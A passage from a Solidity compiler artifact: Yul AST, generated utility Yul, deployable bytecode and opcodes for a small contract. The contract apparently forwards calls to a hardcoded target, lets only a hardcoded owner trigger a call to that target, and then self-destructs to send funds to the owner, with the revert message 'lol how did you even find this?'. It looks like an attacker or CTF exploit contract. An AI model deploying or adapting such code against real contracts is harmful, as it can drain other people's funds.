																					"src": "1053:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "1028:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1028:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1028:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "970:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "973:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "967:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "967:13:1"
															},
															"nodeType": "YulIf",
															"src": "964:101:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "795:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "800:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "805:6:1",
														"type": ""
													}
												],
												"src": "764:307:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1185:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1195:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1241:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "1209:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1209:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "1199:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1256:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1339:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1344:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1263:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1263:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1256:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1386:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1393:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1382:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1382:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1400:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1405:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "1360:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1360:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1360:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1421:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1432:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1437:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1428:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1428:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1421:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1166:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1173:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1181:3:1",
														"type": ""
													}
												],
												"src": "1077:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1590:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1601:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1688:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1697:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1608:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1608:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1601:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1711:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1718:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1711:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1569:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1575:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1586:3:1",
														"type": ""
													}
												],
												"src": "1456:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1829:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1846:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1851:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1839:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1839:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1839:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1867:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1886:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1891:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1882:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1882:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1867:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1801:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1806:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1817:11:1",
														"type": ""
													}
												],
												"src": "1733:169:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2014:75:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nodeType": "YulIdentifier",
																				"src": "2036:6:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2044:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2032:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2032:14:1"
																	},
																	{
																		"hexValue": "6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "2048:33:1",
																		"type": "",
																		"value": "lol how did you even find this?"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2025:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2025:57:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2025:57:1"
														}
													]
												},
												"name": "store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "2006:6:1",
														"type": ""
													}
												],
												"src": "1908:181:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2241:220:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2251:74:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2317:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2322:2:1",
																		"type": "",
																		"value": "31"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2258:58:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2258:67:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "2251:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2423:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																	"nodeType": "YulIdentifier",
																	"src": "2334:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2334:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2334:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2436:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2447:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2452:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2443:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2443:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "2436:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2229:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "2237:3:1",
														"type": ""
													}
												],
												"src": "2095:366:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2638:248:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2648:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2660:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2671:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2656:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2656:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2648:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2695:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2706:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2691:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2691:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "2714:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2720:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "2710:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2710:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2684:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2684:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2684:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2740:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "2874:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2748:124:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2748:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2740:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2618:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2633:4:1",
														"type": ""
													}
												],
												"src": "2467:419:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2937:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2947:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2962:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2969:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "2958:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2958:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2947:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2919:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2929:7:1",
														"type": ""
													}
												],
												"src": "2892:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3069:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3079:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3108:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "3090:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3090:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3079:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3051:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3061:7:1",
														"type": ""
													}
												],
												"src": "3024:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3191:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "3208:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "3231:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "3213:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3213:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3201:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3201:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3201:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3179:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "3186:3:1",
														"type": ""
													}
												],
												"src": "3126:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3348:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3358:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3370:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3381:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "3366:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3366:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "3358:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "3438:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3451:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3462:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3447:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3447:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "3394:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3394:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3394:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "3320:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "3332:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "3343:4:1",
														"type": ""
													}
												],
												"src": "3250:222:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function abi_encode_t_bytes4_to_t_bytes4_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bytes4(value))\n    }\n\n    function abi_encode_tuple_t_bytes4__to_t_bytes4__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bytes4_to_t_bytes4_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22(memPtr) {\n\n        mstore(add(memPtr, 0), \"lol how did you even find this?\")\n\n    }\n\n    function abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 31)\n        store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100225760003560e01c8063157bca60146100ef576100ea565b366100ea57600073cd6a42782d230d7c13a74ddec5dd140e55499df973ffffffffffffffffffffffffffffffffffffffff167f4c228cc7776ff09193dddeaa40b26ebd5d18d89e2b6e01adf9e9d8bfc40dcb166040516020016100859190610288565b6040516020818303038152906040526040516100a1919061031d565b6000604051808303816000865af19150503d80600081146100de576040519150601f19603f3d011682016040523d82523d6000602084013e6100e3565b606091505b5050905050005b600080fd5b3480156100fb57600080fd5b50610104610106565b005b73798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610188576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017f90610391565b60405180910390fd5b600073cd6a42782d230d7c13a74ddec5dd140e55499df990508073ffffffffffffffffffffffffffffffffffffffff1663548853a073798349e06c67272465123b91bd88c5d19b8c78786040518263ffffffff1660e01b81526004016101ee91906103f2565b600060405180830381600087803b15801561020857600080fd5b505af115801561021c573d6000803e3d6000fd5b5050505073798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff16ff5b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6102828161024d565b82525050565b600060208201905061029d6000830184610279565b92915050565b600081519050919050565b600081905092915050565b60005b838110156102d75780820151818401526020810190506102bc565b838111156102e6576000848401525b50505050565b60006102f7826102a3565b61030181856102ae565b93506103118185602086016102b9565b80840191505092915050565b600061032982846102ec565b915081905092915050565b600082825260208201905092915050565b7f6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00600082015250565b600061037b601f83610334565b915061038682610345565b602082019050919050565b600060208201905081810360008301526103aa8161036e565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103dc826103b1565b9050919050565b6103ec816103d1565b82525050565b600060208201905061040760008301846103e3565b9291505056fea26469706673582212208aada7c5c11aa14585f8706b7d1d63d95ccd8cf688145a4e5826d0cf545b8ff764736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x157BCA60 EQ PUSH2 0xEF JUMPI PUSH2 0xEA JUMP JUMPDEST CALLDATASIZE PUSH2 0xEA JUMPI PUSH1 0x0 PUSH20 0xCD6A42782D230D7C13A74DDEC5DD140E55499DF9 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x4C228CC7776FF09193DDDEAA40B26EBD5D18D89E2B6E01ADF9E9D8BFC40DCB16 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x85 SWAP2 SWAP1 PUSH2 0x288 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xA1 SWAP2 SWAP1 PUSH2 0x31D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xDE JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xE3 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x104 PUSH2 0x106 JUMP JUMPDEST STOP JUMPDEST PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x188 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x17F SWAP1 PUSH2 0x391 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xCD6A42782D230D7C13A74DDEC5DD140E55499DF9 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x548853A0 PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1EE SWAP2 SWAP1 PUSH2 0x3F2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x208 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x21C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x282 DUP2 PUSH2 0x24D JUMP 